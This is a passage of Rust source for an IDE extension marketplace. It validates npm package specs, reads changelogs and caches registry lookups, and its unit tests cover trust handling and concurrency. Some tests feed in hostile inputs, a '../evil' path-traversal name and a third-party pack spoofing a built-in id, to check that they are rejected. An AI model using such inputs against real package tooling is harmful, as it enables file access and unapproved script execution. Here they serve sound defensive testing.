/// `None` takes the registry's default (`latest`) tag. Best-effort — `None` on
/// any failure (npm/tar missing, offline, no changelog in the tarball).
fn fetch_published_changelog(pkg: &str, version: Option<&str>) -> Option<String> {
    // Gate the untrusted `pkg`/`version` query params before they reach
    // `npm pack`: `npm pack` accepts far more than a registry name (`../local`,
    // `file:/…`, URLs, git specs), so an unvalidated spec could be coerced into
    // reading local files or fetching arbitrary sources. Reuse the same name
    // check the install path uses, and restrict the version to a safe alphabet
    // (a stray space/`@` would otherwise smuggle a second spec).
    let pkg = pkg.trim();
    if !is_valid_pkg_name(pkg) {
        return None;
    }
    let version = version.map(str::trim).filter(|v| !v.is_empty());
    if version.is_some_and(|v| !is_valid_pkg_version(v)) {
        return None;
    }
    // A dedicated scratch dir under the OS temp dir, torn down before we return.
    // Use exclusive, unpredictable creation (`secure_temp_dir`) so a shared host
    // can't win a symlink/TOCTOU race on a guessable path.
    let scratch = secure_temp_dir("nano-ext-changelog").ok()?;
    let spec = match version {
        Some(v) => format!("{pkg}@{v}"),
        None => pkg.to_string(),
    };
    let result = (|| {
        let tgz = npm_pack_download(&scratch, &spec).ok()?;
        // npm tarballs nest every file under a single top-level `package/` dir
        // (the same invariant `npm_pack_extract` relies on via
        // `--strip-components=1`). We only need the changelog, so stream just
        // that member straight to memory instead of unpacking the whole
        // untrusted archive to disk — smaller attack surface, less I/O.
        for name in CHANGELOG_FILENAMES {
            if let Some(txt) = tar_read_member(&scratch, &tgz, &format!("package/{name}"))
                && !txt.trim().is_empty()
            {
                return Some(txt);
            }
        }
        None
    })();
    let _ = std::fs::remove_dir_all(&scratch);
    result
}

/// Extract the first semver-like token (`x.y.z`, optionally with a
/// `-prerelease` / `+build` suffix) from a line. Used to read the release
/// version out of a changelog heading like `## [1.2.3] - 2024-01-01` or
/// `# [0.71.0](…/compare/v0.70.2...v0.71.0) (2024-…)` — the first token is the
/// heading's own release, not the compare-range endpoints that follow.
fn heading_version(line: &str) -> Option<String> {
    let bytes = line.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i].is_ascii_digit() {
            let start = i;
            let mut dots = 0;
            // Only dots in the core `major.minor.patch` count toward the
            // release requirement; dots inside a `-prerelease` / `+build`
            // suffix (e.g. the `.1` in `2.0-beta.1`) must not, or a `x.y`
            // core would masquerade as a full release.
            let mut in_meta = false;
            while i < bytes.len() {
                let c = bytes[i];
                if c == b'.' {
                    if !in_meta {
                        dots += 1;
                    }
                    i += 1;
                } else if c == b'-' || c == b'+' {
                    in_meta = true;
                    i += 1;
                } else if c.is_ascii_digit() || c.is_ascii_alphabetic() {
                    i += 1;
                } else {
                    break;
                }
            }
            // Require at least major.minor.patch so a bare year/date (e.g.
            // `2024`) or `x.y` never masquerades as a release heading.
            if dots >= 2 {
                let tok = line[start..i].trim_end_matches(['.', '-']);
                if !tok.is_empty() {
                    return Some(tok.to_string());
                }
            }
        } else {
            i += 1;
        }
    }
    None
}

/// Compare a changelog heading's version against a package version for
/// equality, tolerating a leading `v` on either side (`v0.71.0` == `0.71.0`).
fn versions_match(a: &str, b: &str) -> bool {
    a.trim().trim_start_matches('v') == b.trim().trim_start_matches('v')
}

/// Narrow a changelog to just the entries newer than `installed` — the delta a
/// user gains by updating. Changelogs are written newest-first (semantic-release
/// and Keep-a-Changelog both prepend), so the entries above the installed
/// version's heading are exactly the new ones.
///
/// `None` (caller falls back to the full changelog) when the changelog has no
/// parseable version headings, the installed version's heading isn't found, or
/// the installed version is already the newest heading (nothing new to show).
fn changelog_delta(md: &str, installed: &str) -> Option<String> {
    // Index each version heading by its line number, in file order.
    let lines: Vec<&str> = md.lines().collect();
    let headings: Vec<(usize, String)> = lines
        .iter()
        .enumerate()
        .filter(|(_, l)| l.trim_start().starts_with('#'))
        .filter_map(|(i, l)| heading_version(l).map(|v| (i, v)))
        .collect();
    if headings.is_empty() {
        return None;
    }
    // Position of the installed version among the headings (newest-first).
    let pos = headings
        .iter()
        .position(|(_, v)| versions_match(v, installed))?;
    // Already on the newest changelog entry — no delta to surface.
    if pos == 0 {
        return None;
    }
    // Everything from the top down to (but not including) the installed heading.
    let end_line = headings[pos].0;
    let delta = lines[..end_line].join("\n");
    let trimmed = delta.trim();
    if trimmed.is_empty() {
        None
    } else {
        Some(trimmed.to_string())
    }
}

/// Find a program on PATH (plus the usual per-user tool bin dirs). Mirrors
/// [`super::workers::find_deno`]'s resolution order.
///
/// A detached server (e.g. spawned by systemd / at boot) often inherits a
/// minimal PATH like `/usr/local/sbin:…:/bin` that omits the per-user bin dirs
/// where tool installers drop binaries — notably `~/.local/bin` (the astral
/// `uv` installer) and `~/.cargo/bin` (rustup). We fall back to those so a
/// pack's toolchain (`uv`, `cargo`, …) is found for both detection and
/// execution without the operator having to symlink or patch PATH.
///
/// On Windows the tools we resolve are batch shims, not bare executables:
/// `npm` ships as `npm.cmd`, `deno`/`tar` as `.exe`. A literal `dir\npm`
/// probe therefore matches nothing (or, worse, the non-runnable POSIX shell
/// shim npm also drops next to `npm.cmd`), which is why the console showed an
/// empty extension marketplace on Windows: `find_program("npm")` returned
/// `None` and the marketplace listing failed with "npm not found on PATH". So on
/// Windows we mirror cmd.exe's PATHEXT resolution — try `name` + each PATHEXT
/// extension (`.CMD`, `.EXE`, …) before the bare name. `USERPROFILE` is also
/// consulted as the home dir since Windows does not set `HOME`.
pub fn find_program(name: &str) -> Option<PathBuf> {
    let candidates = program_file_candidates(name, cfg!(windows), std::env::var("PATHEXT").ok());
    let first_existing = |dir: &std::path::Path| -> Option<PathBuf> {
        candidates.iter().find_map(|cand| {
            let c = dir.join(cand);
            c.is_file().then_some(c)
        })
    };
    if let Ok(path) = std::env::var("PATH") {
        for d in std::env::split_paths(&path) {
            if let Some(hit) = first_existing(&d) {
                return Some(hit);
            }
        }
    }
    let home_dirs = ["HOME", "USERPROFILE"]
        .into_iter()
        .filter_map(std::env::var_os)
        .map(PathBuf::from);
    for home in home_dirs {
        for bin in [
            home.join(".local").join("bin"),
            home.join(".cargo").join("bin"),
        ] {
            if let Some(hit) = first_existing(&bin) {
                return Some(hit);
            }
        }
    }
    None
}

/// Build the ordered list of filenames to probe for a program in a directory.
///
/// POSIX: just the bare name. Windows: `name` + each extension from `PATHEXT`
/// (executable extensions come first so `npm.cmd` wins over npm's non-runnable
/// bare POSIX shim), then the bare name last as a fallback. A name that already
/// carries a PATHEXT extension is probed verbatim only. Exported for unit tests
/// so the Windows branch is exercised from a POSIX host.
pub(crate) fn program_file_candidates(
    name: &str,
    windows: bool,
    pathext: Option<String>,
) -> Vec<String> {
    if !windows {
        return vec![name.to_string()];
    }
    // Default mirrors a stock Windows PATHEXT.
    let raw = pathext.unwrap_or_else(|| ".COM;.EXE;.BAT;.CMD".to_string());
    let exts: Vec<String> = raw
        .split(';')
        .map(str::trim)
        .filter(|e| !e.is_empty())
        .map(|e| {
            if e.starts_with('.') {
                e.to_string()
            } else {
                format!(".{e}")
            }
        })
        .map(|e| e.to_ascii_lowercase())
        .collect();
    // If the name already ends with one of these extensions, use it verbatim.
    // `exts` is already lowercased, so compare against a single lowercased copy
    // of the name rather than re-lowercasing per extension.
    let name_lower = name.to_ascii_lowercase();
    let already_has_ext = exts.iter().any(|e| name_lower.ends_with(e.as_str()));
    if already_has_ext {
        return vec![name.to_string()];
    }
    let mut out: Vec<String> = exts.iter().map(|e| format!("{name}{e}")).collect();
    out.push(name.to_string());
    out
}

/// Whether a pack's toolchain is installed (detect probe). Built-in/empty => true.
pub fn toolchain_available(m: &ExtManifest) -> bool {
    match m.toolchain.detect.first() {
        Some(bin) => find_program(bin).is_some(),
        None => true,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Tests that mutate `NANOBPMN_EXTENSIONS_DIR` (a process-global env var)
    /// must serialize on this mutex — cargo test runs them in parallel by
    /// default, so two concurrent tests would race on the env var and read
    /// each other's temp dirs. Use `let _guard = ENV_LOCK.lock().unwrap();`
    /// at the top of any such test.
    static ENV_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());

    #[test]
    fn install_deps_defaults_false_and_round_trips() {
        // A manifest written before `installDeps` existed must keep parsing and
        // default to false (pure pack+extract, no npm install).
        let old = r#"{"id":"x","kind":"app","displayName":"X"}"#;
        let m: ExtManifest = serde_json::from_str(old).unwrap();
        assert!(!m.install_deps, "absent installDeps must default to false");

        // The opt-in flag round-trips through serde.
        let on = r#"{"id":"u","kind":"app","displayName":"Urban","installDeps":true}"#;
        let m: ExtManifest = serde_json::from_str(on).unwrap();
        assert!(m.install_deps);
        let back: ExtManifest = serde_json::from_str(&serde_json::to_string(&m).unwrap()).unwrap();
        assert!(back.install_deps);
    }

    #[test]
    fn npm_install_argv_untrusted_ignores_scripts_and_omits_dev() {
        // Untrusted (the default for a freshly-installed pack): no lifecycle
        // scripts, no dev deps, and `install` (no lockfile).
        let a = npm_install_argv(false, false);
        assert_eq!(a.first().map(String::as_str), Some("install"));
        assert!(a.iter().any(|x| x == "--omit=dev"), "must omit dev deps");
        assert!(
            a.iter().any(|x| x == "--ignore-scripts"),
            "untrusted install must block lifecycle scripts"
        );
    }

    #[test]
    fn npm_install_argv_trusted_runs_scripts_and_ci_with_lockfile() {
        // Trusted + lockfile present: reproducible `ci`, and lifecycle scripts
        // are permitted (the user has accepted this pack's code).
        let a = npm_install_argv(true, true);
        assert_eq!(a.first().map(String::as_str), Some("ci"));
        assert!(a.iter().any(|x| x == "--omit=dev"));
        assert!(
            !a.iter().any(|x| x == "--ignore-scripts"),
            "trusted install may run lifecycle scripts"
        );
    }

    #[test]
    fn urban_pack_pkg_maps_to_resolver_dir() {
        // The install target and the `urban` resolver's lookup target must be
        // the SAME directory, or a lazy install would never be found. The
        // scoped pack name maps through `safe_pkg_dir` (`@scope/name →
        // scope__name`) to `<extensions>/nanobpm__nano-ide-app-urban`, so
        // pack_install_dir(URBAN_PACK_PKG) must end in that exact dir name.
        let _guard = ENV_LOCK.lock().unwrap();
        let root = std::env::temp_dir().join(format!("nano-ext-urbanpkg-{}", std::process::id()));
        // SAFETY: test-local env set, serialized on ENV_LOCK.
        unsafe { std::env::set_var("NANOBPMN_EXTENSIONS_DIR", &root) };
        let dir = pack_install_dir(URBAN_PACK_PKG).expect("valid pack name");
        assert_eq!(
            dir.file_name().and_then(|s| s.to_str()),
            Some("nanobpm__nano-ide-app-urban")
        );
        assert_eq!(dir, extensions_root().join("nanobpm__nano-ide-app-urban"));
        // The pack is first-party, so it must be flagged official in the
        // marketplace — which keys off the `@nanobpm/` scope.
        assert!(is_official(URBAN_PACK_PKG), "urban pack must be official");
        unsafe { std::env::remove_var("NANOBPMN_EXTENSIONS_DIR") };
    }

    #[test]
    fn builtins_cover_deno_and_gui() {
        // Rust (and Java) are pack-provided, not built-in — installing the
        // nano-ide lang pack is what adds them. Only the Deno runtime ships in-box.
        let ids: BTreeSet<_> = builtin_extensions().into_iter().map(|e| e.id).collect();
        assert!(ids.contains("deno") && ids.contains("deno-gui"));
        assert!(
            !ids.contains("rust"),
            "rust is now pack-provided, not built-in"
        );
    }

    #[test]
    fn builtins_are_always_trusted() {
        assert!(is_trusted("deno"));
        assert!(is_trusted("deno-gui"));
    }

    #[test]
    fn install_scripts_trust_ignores_builtin_id_spoof() {
        // A pack fetched from npm is never a bundled built-in, so a self-declared
        // built-in id must NOT grant implicit trust to run lifecycle scripts —
        // otherwise a third-party pack could ship `"id": "deno"` and, with
        // `installDeps: true`, execute arbitrary npm install scripts. Contrast
        // `is_trusted`, which DOES honour the built-in shortcut (unchanged).
        let none = TrustStore::default();
        assert!(is_trusted("deno"), "built-in id trusted via is_trusted");
        assert!(
            !install_scripts_trusted(&none, "deno"),
            "a downloaded pack spoofing a built-in id must not be install-trusted"
        );

        // The global yolo bypass still trusts everything.
        let yolo = TrustStore {
            yolo: true,
            approved: BTreeSet::new(),
        };
        assert!(install_scripts_trusted(&yolo, "deno"));

        // An explicit approve-always of this exact pack id trusts it; a
        // different id (including a built-in one) stays untrusted.
        let approved = TrustStore {
            yolo: false,
            approved: ["evil-pack".to_string()].into_iter().collect(),
        };
        assert!(install_scripts_trusted(&approved, "evil-pack"));
        assert!(!install_scripts_trusted(&approved, "deno"));
    }

    #[test]
    fn lang_lookup() {
        // Deno is the only built-in lang pack; rust/java come from installed packs.
        assert_eq!(lang_pack("deno").unwrap().display_name, "Deno (TypeScript)");
        assert!(lang_pack("rust").is_none());
    }

    #[test]
    fn pkg_dir_flattens_scope() {
        let p = safe_pkg_dir("@nanobpm/nano-ide-lang-rust").unwrap();
        assert!(p.ends_with("nanobpm__nano-ide-lang-rust"));
        assert!(safe_pkg_dir("../evil").is_none());
    }

    #[test]
    fn classify_category_maps_keywords() {
        let kw = |s: &str| vec![MARKETPLACE_KEYWORD.to_string(), s.to_string()];
        assert_eq!(classify_category(&kw("nano-ide-lang")), "lang");
        assert_eq!(classify_category(&kw("nano-ide-app")), "app");
        assert_eq!(classify_category(&kw("nano-ide-example")), "example");
        assert_eq!(classify_category(&kw("nano-ide-theme")), "theme");
        assert_eq!(classify_category(&kw("nano-ide-trigger")), "trigger");
        assert_eq!(
            classify_category(&kw("nano-ide-agentic-sdlc")),
            "agentic-sdlc"
        );
        // No recognised category keyword -> "other".
        assert_eq!(
            classify_category(&[MARKETPLACE_KEYWORD.to_string()]),
            "other"
        );
    }

    #[test]
    fn marketplace_search_args_cap_the_result_page() {
        // Defect-class guard: `npm search` defaults to 20 hits, so once more
        // than 20 packs carry the marketplace keyword the tail is silently
        // dropped and low-popularity packs vanish from the console. The search
        // invocation MUST pin an explicit, large `--searchlimit`.
        let args = marketplace_search_args();
        assert_eq!(args.first().map(String::as_str), Some("search"));
        assert!(
            args.iter().any(|a| a == "--json"),
            "search must request --json output"
        );
        let limit = args
            .iter()
            .find_map(|a| a.strip_prefix("--searchlimit="))
            .expect("marketplace search must pin an explicit --searchlimit");
        let limit: usize = limit
            .parse()
            .expect("--searchlimit must be a positive integer");
        // Well clear of npm's default of 20 — request the registry's max page.
        assert!(
            limit >= 250,
            "--searchlimit={limit} is too small; the marketplace truncates the catalogue as it grows"
        );
        assert_eq!(limit, MARKETPLACE_SEARCH_LIMIT);
    }

    /// Build a successful `std::process::Output` with the given stdout, so a
    /// mock [`NpmRunner`] can stand in for a real `npm` without spawning one.
    fn ok_output(stdout: &str) -> std::process::Output {
        #[cfg(unix)]
        let status = {
            use std::os::unix::process::ExitStatusExt;
            std::process::ExitStatus::from_raw(0)
        };
        #[cfg(windows)]
        let status = {
            use std::os::windows::process::ExitStatusExt;
            std::process::ExitStatus::from_raw(0)
        };
        std::process::Output {
            status,
            stdout: stdout.as_bytes().to_vec(),
            stderr: Vec::new(),
        }
    }

    /// A counting, non-spawning [`NpmRunner`]: it records how many `npm search`
    /// calls happen and the peak number of concurrent `npm view` calls, so the
    /// #1330 guard can assert the single-flight / bounded-fan-out contract
    /// without starting real Node processes.
    struct MockNpm {
        search_calls: std::sync::atomic::AtomicUsize,
        view_calls: std::sync::atomic::AtomicUsize,
        view_concurrent: std::sync::atomic::AtomicUsize,
        view_peak: std::sync::atomic::AtomicUsize,
        search_json: String,
    }

    impl NpmRunner for MockNpm {
        fn run(&self, args: &[&str]) -> std::io::Result<std::process::Output> {
            use std::sync::atomic::Ordering::SeqCst;
            match args.first().copied() {
                Some("search") => {
                    self.search_calls.fetch_add(1, SeqCst);
                    Ok(ok_output(&self.search_json))
                }
                Some("view") => {
                    self.view_calls.fetch_add(1, SeqCst);
                    let now = self.view_concurrent.fetch_add(1, SeqCst) + 1;
                    self.view_peak.fetch_max(now, SeqCst);
                    // Hold the "process" open long enough that an unbounded
                    // fan-out would overlap and trip the cap assertion.
                    std::thread::sleep(std::time::Duration::from_millis(40));
                    self.view_concurrent.fetch_sub(1, SeqCst);
                    Ok(ok_output("9.9.9"))
                }
                _ => Ok(ok_output("")),
            }
        }
    }

    /// #1330 guard: N concurrent marketplace requests must collapse to **one**
    /// `npm search` (single-flight cache) and run **at most
    /// [`REFRESH_LATEST_CONCURRENCY`]** `npm view` probes at a time, no matter
    /// how many packs are installed — the uncapped one-thread-per-pack fan-out
    /// under a 30 s cross-tab poll is what swap-thrashed a small host.
    #[test]
    fn concurrent_marketplace_requests_single_flight_and_cap_view_fanout() {
        use std::sync::atomic::{AtomicUsize, Ordering::SeqCst};
        let _guard = ENV_LOCK.lock().unwrap();
        let root = std::env::temp_dir().join(format!("nano-ext-mkt-sf-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        // SAFETY: test-local env set; serialized on ENV_LOCK.
        unsafe { std::env::set_var("NANOBPMN_EXTENSIONS_DIR", &root) };

        // Six installed packs — more than the cap — so an uncapped fan-out would
        // put six `npm view` processes live at once.
        let packs = [
            "@nanobpm/pack-a",
            "@nanobpm/pack-b",
            "@nanobpm/pack-c",
            "@nanobpm/pack-d",
            "@nanobpm/pack-e",
            "@nanobpm/pack-f",
        ];
        for p in packs {
            let dir = safe_pkg_dir(p).unwrap();
            std::fs::create_dir_all(&dir).unwrap();
            std::fs::write(dir.join("package.json"), r#"{"version":"1.0.0"}"#).unwrap();
        }
        let search_json = serde_json::to_string(
            &packs
                .iter()
                .map(|n| {
                    serde_json::json!({
                        "name": n,
                        "version": "1.0.0",
                        "keywords": [MARKETPLACE_KEYWORD],
                    })
                })
                .collect::<Vec<_>>(),
        )
        .unwrap();

        let runner = MockNpm {
            search_calls: AtomicUsize::new(0),
            view_calls: AtomicUsize::new(0),
            view_concurrent: AtomicUsize::new(0),
            view_peak: AtomicUsize::new(0),
            search_json,
        };
        let cache = MarketplaceCache::new(std::time::Duration::from_secs(300));

        // Fire several concurrent callers — the burst a multi-tab 30 s poll
        // produced. They must share one computation.
        std::thread::scope(|scope| {
            for _ in 0..8 {
                scope.spawn(|| {
                    let _ = cache.fetch(false, || marketplace_impl(&runner));
                });
            }
        });

        assert_eq!(
            runner.search_calls.load(SeqCst),
            1,
            "single-flight: concurrent pollers must share exactly one npm search"
        );
        assert_eq!(
            runner.view_calls.load(SeqCst),
            packs.len(),
            "each installed pack is probed exactly once (no duplicate fan-out)"
        );
        let peak = runner.view_peak.load(SeqCst);
        assert!(
            peak <= REFRESH_LATEST_CONCURRENCY,
            "npm view concurrency must be capped at {REFRESH_LATEST_CONCURRENCY}, saw {peak}"
        );

        let _ = std::fs::remove_dir_all(&root);
        unsafe { std::env::remove_var("NANOBPMN_EXTENSIONS_DIR") };
    }

    /// The cache serves a fresh result without recomputing, and `force` bypasses
    /// the TTL — the "check now" affordance still routes through the same
    /// single-flight computation.
    #[test]
    fn marketplace_cache_serves_fresh_then_force_bypasses_ttl() {
        let cache = MarketplaceCache::new(std::time::Duration::from_secs(300));
        let calls = std::sync::atomic::AtomicUsize::new(0);
        let compute = || {
            calls.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
            Ok::<_, String>(Vec::<MarketEntry>::new())
        };

        // First call computes and caches.
        cache.fetch(false, compute).unwrap();
        // Second call within the TTL is served from cache — no recompute.
        cache.fetch(false, compute).unwrap();
        assert_eq!(
            calls.load(std::sync::atomic::Ordering::SeqCst),
            1,
            "a fresh cached result must not recompute"
        );
        // A forced "check now" bypasses the TTL and recomputes.
        cache.fetch(true, compute).unwrap();
        assert_eq!(
            calls.load(std::sync::atomic::Ordering::SeqCst),
            2,
            "force must bypass the cache TTL"
        );
    }

    /// A panicking computation must not wedge the cache: `in_flight` is
    /// cleared, waiters are woken, and a later fetch completes. Without the
    /// `catch_unwind` guard, one panic stranded `in_flight = true` and every
    /// subsequent request (cache misses and forced refreshes alike) waited on
    /// the condvar until process restart.
    #[test]
    fn marketplace_cache_recovers_after_a_panicking_computation() {
        let cache = MarketplaceCache::new(std::time::Duration::from_secs(300));

        // The panicking leader surfaces as an ordinary error, not an unwind.
        let err = match cache.fetch(false, || -> Result<Vec<MarketEntry>, String> {
            panic!("boom");
        }) {
            Ok(_) => panic!("a panicking computation must not succeed"),
            Err(e) => e,
        };
        assert!(
            err.contains("panicked"),
            "a panicking computation must surface as an error, got: {err}"
        );

        // The cache is not wedged: a later fetch computes and completes.
        let ok = cache
            .fetch(false, || Ok::<_, String>(Vec::<MarketEntry>::new()))
            .unwrap();
        assert!(ok.is_empty());
    }

    /// A failed computation is shared with **every** waiter of that
    /// computation: N concurrent callers see the same single error and exactly
    /// one `npm` attempt runs — not N serial retries, each waiting through its
    /// own registry timeout. The retry belongs to the *next* request.
    #[test]
    fn marketplace_cache_shares_a_failed_computation_with_all_waiters() {
        use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering::SeqCst};
        use std::sync::{Arc, Condvar, Mutex};
        const WAITERS: usize = 7; // one leader + seven followers = eight callers

        let cache = MarketplaceCache::new(std::time::Duration::from_secs(300));
        let calls = AtomicUsize::new(0);

        // Deterministic synchronisation (no sleeps): every follower that joins
        // the in-flight run bumps `joined` through the cache's test hook, and
        // the leader is released only once all seven have *provably* joined —
        // so a follower the scheduler is slow to start can never race past the
        // finished leader and begin a second computation (the failure mode a
        // fixed sleep could not rule out). A bounded wait reports a failed
        // sync instead of hanging.
        let joined = Arc::new((Mutex::new(0usize), Condvar::new()));
        {
            let joined = Arc::clone(&joined);
            cache.set_on_waiter_joined(move || {
                let (lock, cv) = &*joined;
                *lock.lock().unwrap() += 1;
                cv.notify_all();
            });
        }
        let timed_out = Arc::new(AtomicBool::new(false));

        let results: Vec<Result<(), String>> = std::thread::scope(|scope| {
            let mut handles = Vec::new();
            for _ in 0..(WAITERS + 1) {
                let cache = &cache;
                let calls = &calls;
                let joined = Arc::clone(&joined);
                let timed_out = Arc::clone(&timed_out);
                handles.push(scope.spawn(move || {
                    cache
                        .fetch(false, move || {
                            // Only the leader runs this. Block until every
                            // follower has joined this exact flight, then fail —
                            // proving all seven are waiters of one run, never
                            // sequential leaders.
                            calls.fetch_add(1, SeqCst);
                            let (lock, cv) = &*joined;
                            let mut n = lock.lock().unwrap();
                            let start = std::time::Instant::now();
                            let deadline = std::time::Duration::from_secs(10);
                            while *n < WAITERS {
                                let Some(rem) = deadline.checked_sub(start.elapsed()) else {
                                    timed_out.store(true, SeqCst);
                                    break;
                                };
                                let (g, to) = cv.wait_timeout(n, rem).unwrap();
                                n = g;
                                if to.timed_out() && *n < WAITERS {
                                    timed_out.store(true, SeqCst);
                                    break;
                                }
                            }
                            Err::<Vec<MarketEntry>, _>("npm search: offline".to_string())
                        })
                        .map(|_| ())
                }));
            }
            handles.into_iter().map(|h| h.join().unwrap()).collect()
        });

        assert!(
            !timed_out.load(SeqCst),
            "every follower must join the single flight before the leader completes"
        );
        assert_eq!(
            calls.load(SeqCst),
            1,
            "a failed computation must run once for the whole burst, not once per waiter"
        );
        assert!(
            results.iter().all(|r| r.is_err()),
            "every waiter must see the shared failure"
        );
    }

    /// A later leader must never steal the outcome an earlier flight's waiters
    /// are about to read. A single shared "last outcome" slot let a new leader
    /// clear it between the previous run's `notify_all` and its waiters
    /// resuming, dragging those waiters through a *second* `npm` timeout even
    /// though their own run had already produced a result. The per-flight
    /// handle isolates each run's waiters from every later leader.
    ///
    /// This test parks a flight-1 follower *after* it has cloned flight 1's
    /// `Arc` but *before* it reads the outcome, completes flight 1, then runs a
    /// forced flight 2 to a distinct result while the follower is still parked.
    /// Releasing the follower must yield flight 1's result — a regression to a
    /// shared outcome slot would instead surface flight 2's (or block on it).
    #[test]
    fn marketplace_cache_waiters_read_their_own_flight_not_a_later_leaders() {
        use std::sync::atomic::{AtomicUsize, Ordering::SeqCst};
        use std::sync::{Arc, Barrier, Condvar, Mutex};

        let cache = MarketplaceCache::new(std::time::Duration::from_secs(300));
        let leader_calls = AtomicUsize::new(0);

        let entry = |name: &str| MarketEntry {
            name: name.to_string(),
            version: "1.0.0".to_string(),
            description: String::new(),
            category: "lang".to_string(),
            official: true,
            installed: false,
            installed_version: None,
            update_available: false,
            repository: None,
            homepage: None,
            npm_url: None,
            changelog_available: false,
        };

        // Release flight 1's leader only once its follower has joined the
        // flight (bounded, so a regression fails rather than hangs).
        let joined = Arc::new((Mutex::new(0usize), Condvar::new()));
        {
            let joined = Arc::clone(&joined);
            cache.set_on_waiter_joined(move || {
                let (lock, cv) = &*joined;
                *lock.lock().unwrap() += 1;
                cv.notify_all();
            });
        }

        // Park the flight-1 follower at the wait gate until the main thread has
        // completed flight 2. `parked` signals the follower reached the gate;
        // `release` lets it through to read its outcome.
        let parked = Arc::new(Barrier::new(2));
        let release = Arc::new(Barrier::new(2));
        {
            let parked = Arc::clone(&parked);
            let release = Arc::clone(&release);
            cache.set_on_waiter_wait(move || {
                parked.wait();
                release.wait();
            });
        }

        let follower = std::thread::scope(|scope| {
            // Flight 1 leader: waits for its follower, then returns flight-1.
            let leader = scope.spawn(|| {
                cache
                    .fetch(false, {
                        let joined = Arc::clone(&joined);
                        let entry = &entry;
                        let leader_calls = &leader_calls;
                        move || {
                            leader_calls.fetch_add(1, SeqCst);
                            let (lock, cv) = &*joined;
                            let mut n = lock.lock().unwrap();
                            let start = std::time::Instant::now();
                            while *n < 1 {
                                let rem = std::time::Duration::from_secs(10)
                                    .saturating_sub(start.elapsed());
                                let (g, to) = cv.wait_timeout(n, rem).unwrap();
                                n = g;
                                assert!(
                                    !to.timed_out(),
                                    "flight-1 follower never joined the flight"
                                );
                            }
                            Ok::<_, String>(vec![entry("flight-1")])
                        }
                    })
                    .map(|arc| arc[0].name.clone())
                    .unwrap()
            });

            // Flight 1 follower: joins, then is parked at the wait gate.
            let follower = scope.spawn(|| {
                cache
                    .fetch(false, || {
                        unreachable!("a follower never computes; it joins flight 1")
                    })
                    .map(|arc| arc[0].name.clone())
                    .unwrap()
            });

            // Wait until the follower is parked at the gate (holding flight 1's
            // Arc, not yet reading the outcome), then let flight 1 finish.
            parked.wait();
            let leader_outcome = leader.join().unwrap();
            assert_eq!(leader_outcome, "flight-1");

            // Flight 1 is complete and retired. Start a *forced* flight 2 with
            // a distinct result while the follower is still parked. A shared
            // outcome slot would now hold flight 2's value, ready to ambush the
            // parked follower.
            let second = cache
                .fetch(true, {
                    let entry = &entry;
                    let leader_calls = &leader_calls;
                    move || {
                        leader_calls.fetch_add(1, SeqCst);
                        Ok::<_, String>(vec![entry("flight-2")])
                    }
                })
                .map(|arc| arc[0].name.clone())
                .unwrap();
            assert_eq!(second, "flight-2", "the forced refresh must recompute");

            // Release the parked follower and read what it observed.
            release.wait();
            follower.join().unwrap()
        });

        assert_eq!(
            follower, "flight-1",
            "a parked flight-1 waiter must read its own flight's outcome, not a later leader's"
        );
        assert_eq!(
            leader_calls.load(SeqCst),
            2,
            "exactly two computations ran: flight 1 and the forced flight 2"
        );
    }

    /// The installation state of a cached listing is re-derived from the live
    /// pack store on every response: an install, an update, and a removal that
    /// happen **within the cache TTL** are reflected immediately — the cached
    /// registry metadata is reused, but the Install/Update/Remove affordances
    /// never go stale.
    #[test]
    fn overlay_install_state_reflects_mutations_within_the_cache_ttl() {
        let _guard = ENV_LOCK.lock().unwrap();
        let root = std::env::temp_dir().join(format!("nano-ext-mkt-ovl-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        // SAFETY: test-local env set; serialized on ENV_LOCK.
        unsafe { std::env::set_var("NANOBPMN_EXTENSIONS_DIR", &root) };

        let entry = |name: &str, version: &str| MarketEntry {
            name: name.to_string(),
            version: version.to_string(),
            description: String::new(),
            category: "lang".to_string(),
            official: true,
            installed: false,
            installed_version: None,
            update_available: false,
            repository: None,
            homepage: None,
            npm_url: None,
            changelog_available: false,
        };
        let write_pack = |name: &str, version: &str| {
            let dir = safe_pkg_dir(name).unwrap();
            std::fs::create_dir_all(&dir).unwrap();
            std::fs::write(
                dir.join("package.json"),
                format!(r#"{{"version":"{version}"}}"#),
            )
            .unwrap();
        };

        // Install: a pack that was not installed when the listing was computed
        // shows as installed, at the installed version, with no pending update.
        write_pack("@nanobpm/pack-new", "2.0.0");
        let out = overlay_install_state(vec![entry("@nanobpm/pack-new", "2.0.0")]);
        assert!(out[0].installed, "a fresh install must show installed");
        assert_eq!(out[0].installed_version.as_deref(), Some("2.0.0"));
        assert!(!out[0].update_available);

        // Update: the installed version (2.0.0, on disk) lags the cached latest
        // 2.1.0 → Update offered.
        let out = overlay_install_state(vec![entry("@nanobpm/pack-new", "2.1.0")]);
        assert!(out[0].update_available, "a newer latest must offer Update");
        // …and after the update is pulled, the same cached metadata no longer
        // offers it.
        write_pack("@nanobpm/pack-new", "2.1.0");
        let out = overlay_install_state(vec![entry("@nanobpm/pack-new", "2.1.0")]);
        assert!(
            !out[0].update_available,
            "a completed update must clear the Update affordance"
        );

        // Stale cached metadata must never advertise a *downgrade*: the pack is
        // installed at 2.1.0 (an unpinned install pulled npm's latest) while the
        // cached registry `version` still lags at 2.0.0. A string-inequality
        // check (`iv != version`) would falsely offer an "update" to the older
        // 2.0.0; semver ordering keeps it honest — installed ≥ latest ⇒ no
        // update (#1330).
        let out = overlay_install_state(vec![entry("@nanobpm/pack-new", "2.0.0")]);
        assert!(
            !out[0].update_available,
            "stale cached metadata must not advertise a downgrade as an update"
        );
        assert_eq!(out[0].installed_version.as_deref(), Some("2.1.0"));

        // Removal: the pack disappears from the store → Install offered again.
        std::fs::remove_dir_all(safe_pkg_dir("@nanobpm/pack-new").unwrap()).unwrap();
        let out = overlay_install_state(vec![entry("@nanobpm/pack-new", "2.1.0")]);
        assert!(!out[0].installed, "a removed pack must offer Install");
        assert_eq!(out[0].installed_version, None);
        assert!(!out[0].update_available);

        let _ = std::fs::remove_dir_all(&root);
        unsafe { std::env::remove_var("NANOBPMN_EXTENSIONS_DIR") };
    }

    #[test]
    fn version_cmp_orders_by_semver_precedence() {
        use std::cmp::Ordering;
